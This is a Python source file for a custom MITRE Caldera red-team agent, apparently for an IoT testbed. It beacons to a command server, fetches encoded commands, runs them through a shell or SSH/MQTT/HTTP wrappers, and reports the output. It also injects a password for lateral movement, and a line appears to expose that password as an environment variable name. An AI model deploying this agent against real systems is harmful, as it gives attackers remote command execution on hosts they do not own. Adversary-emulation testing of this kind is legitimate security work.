#!/usr/bin/env python3
"""
Custom MITRE Caldera Agent for Node‑RED IoT Testbed
Advertises built‑in executors (sh/psh/native/shellcode) to work with UI dropdown.
Supports both custom IoT commands (http/mqtt/ssh) and generic shell commands.
"""
import base64
import hashlib
import json
import logging
import os
import socket
import subprocess
import sys
import time
from pathlib import Path
import shlex
import requests

# -------------------- CONFIG --------------------
CALDERA_SERVER = os.getenv("CALDERA_SERVER", "http://localhost:8888")
AGENT_GROUP = os.getenv("AGENT_GROUP", "red")
BEACON_INTERVAL = int(os.getenv("BEACON_INTERVAL", "10"))
VERIFY_SSL = os.getenv("VERIFY_SSL", "false").lower() == "true"
AGENT_USER_AGENT = os.getenv("AGENT_USER_AGENT", "IoT-Sim-Caldera-Agent/1.0")
SIMHOST_PASSWORD = os.getenv("kali2024")

# -------------------- LOGGING --------------------
logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] %(levelname)s: %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
logger = logging.getLogger("IoTCalderaAgent")

if SIMHOST_PASSWORD is None:
    logger.warning("SIMHOST_PASSWORD not set; lateral movement will likely fail.")
else:
    logger.info(f"SIMHOST_PASSWORD is set (length {len(SIMHOST_PASSWORD)})")

# -------------------- EXECUTOR MAP (custom wrappers) --------------------
EXECUTOR_SCRIPTS = {
    "http": "http_exec.py",
    "mqtt": "mqtt_exec.py",
    "ssh": "ssh_exec.py",
}

# -------------------- AGENT STATE --------------------
class AgentState:
    paw = None

def generate_profile():
    if AgentState.paw is None:
        hostname = socket.gethostname()
        AgentState.paw = hashlib.md5(hostname.encode()).hexdigest()[:12]
        logger.info(f"PAW derived from hostname: {AgentState.paw}")
    return {
        "paw": AgentState.paw,
        "group": AGENT_GROUP,
        "platform": "linux",
        "host": socket.gethostname(),
        "username": os.getenv("USER", "researcher"),
        # Advertise built‑in executors so UI dropdown works
        "executors": ["sh", "psh", "native", "shellcode"],
        "privilege": "User",
        "architecture": "amd64",
        "location": "unknown"
    }

def beacon():
    """Send base64‑encoded profile, receive base64‑encoded response."""
    profile = generate_profile()
    try:
        payload = base64.b64encode(json.dumps(profile).encode()).decode()
        resp = requests.post(
            f"{CALDERA_SERVER}/beacon",
            data=payload,
            headers={"User-Agent": AGENT_USER_AGENT},
            timeout=30,
            verify=VERIFY_SSL,
        )
        if resp.status_code == 200:
            try:
                raw_text = resp.text.strip()
                try:
                    decoded = base64.b64decode(raw_text).decode("utf-8")
                    data = json.loads(decoded)
                except Exception:
                    data = resp.json()
                if "paw" in data:
                    AgentState.paw = data["paw"]
                instructions = data.get("instructions", [])
                if isinstance(instructions, str):
                    try:
                        instructions = json.loads(instructions)
                        if not isinstance(instructions, list):
                            instructions = [instructions]
                    except:
                        instructions = [instructions]
                elif not isinstance(instructions, list):
                    instructions = []
                sleep = data.get("sleep", BEACON_INTERVAL)
                logger.info(f"Beacon OK – {len(instructions)} instruction(s), sleep {sleep}s")
                return instructions, sleep
            except Exception as e:
                logger.error(f"Decode/parse error: {e}")
                logger.debug(f"Raw response: {raw_text[:200]}")
        else:
            logger.warning(f"Beacon HTTP {resp.status_code}")
            logger.debug(f"Response: {resp.text[:500]}")
    except requests.exceptions.RequestException as e:
        logger.error(f"Beacon request failed: {e}")
    return [], BEACON_INTERVAL

def post_result(ability_id, output=b"", stderr=b"", exit_code=1, status=1):
    """Send results as base64‑encoded JSON."""
    try:
        results = [{
            "id": ability_id,
            "output": base64.b64encode(output).decode(),
            "stderr": base64.b64encode(stderr).decode(),
            "exit_code": exit_code,
            "status": status,
            "pid": os.getpid()
        }]
        payload = base64.b64encode(json.dumps({"paw": AgentState.paw, "results": results}).encode()).decode()
        requests.post(
            f"{CALDERA_SERVER}/beacon",
            data=payload,
            headers={"User-Agent": AGENT_USER_AGENT},
            timeout=10,
            verify=VERIFY_SSL,
        )
    except Exception as e:
        logger.error(f"Failed to post result: {e}")

def substitute_placeholders(command):
    return command.replace("<SIMHOST_PASSWORD>", SIMHOST_PASSWORD or "")

def run_ability(instruction):
    if isinstance(instruction, str):
        try:
            instruction = json.loads(instruction)
        except:
            instruction = {"id": "unknown", "command": instruction}
    if not isinstance(instruction, dict):
        logger.error(f"Invalid instruction type: {type(instruction)}")
        return

    ability_id = instruction.get("id", "unknown")
    try:
        cmd_b64 = instruction.get("command", "")
        if not cmd_b64:
            logger.warning("No command in instruction")
            return
        try:
            cmd_decoded = base64.b64decode(cmd_b64).decode("utf-8", errors="ignore").strip()
        except Exception:
            cmd_decoded = cmd_b64.strip()
        cmd_decoded = substitute_placeholders(cmd_decoded)
        logger.info(f"Ability {ability_id}: {cmd_decoded}")

        # Split into first word (potential executor type) and rest
        parts = cmd_decoded.split(maxsplit=1)
        if not parts:
            raise ValueError("Empty command")
        first_word = parts[0].lower()
        args_str = parts[1] if len(parts) > 1 else ""

        # Route to custom wrapper if first word is http/mqtt/ssh
        if first_word in EXECUTOR_SCRIPTS:
            script_dir = Path(__file__).parent.absolute()
            script_path = script_dir / EXECUTOR_SCRIPTS[first_word]
            if not script_path.is_file():
                raise FileNotFoundError(f"Missing wrapper: {script_path}")
            arg_list = shlex.split(args_str)
            cmd_list = [sys.executable, str(script_path)] + arg_list
            logger.debug(f"Running custom wrapper: {' '.join(cmd_list)}")
            result = subprocess.run(cmd_list, capture_output=True, timeout=60, text=False)
        else:
            # Generic shell command – run it directly
            logger.info(f"Generic shell command: {cmd_decoded}")
            result = subprocess.run(cmd_decoded, shell=True, capture_output=True, timeout=60, text=False)

        post_result(
            ability_id,
            output=result.stdout,
            stderr=result.stderr,
            exit_code=result.returncode,
            status=0 if result.returncode == 0 else 1,
        )
        logger.info(f"Result for {ability_id} posted (exit={result.returncode})")

    except Exception as e:
        logger.error(f"Ability {ability_id} error: {e}")
        post_result(ability_id, stderr=str(e).encode(), exit_code=1, status=1)

def main():
    logger.info(f"IoT Caldera Agent - server: {CALDERA_SERVER}")
    logger.info(f"PAW: {generate_profile()['paw']}")
    while True:
        try:
            instructions, sleep_seconds = beacon()
            for instr in instructions:
                run_ability(instr)
            time.sleep(sleep_seconds)
        except KeyboardInterrupt:
            logger.info("Agent terminated by user")
            break
        except Exception as e:
            logger.error(f"Main loop error: {e}")
            time.sleep(30)

if __name__ == "__main__":
    main()
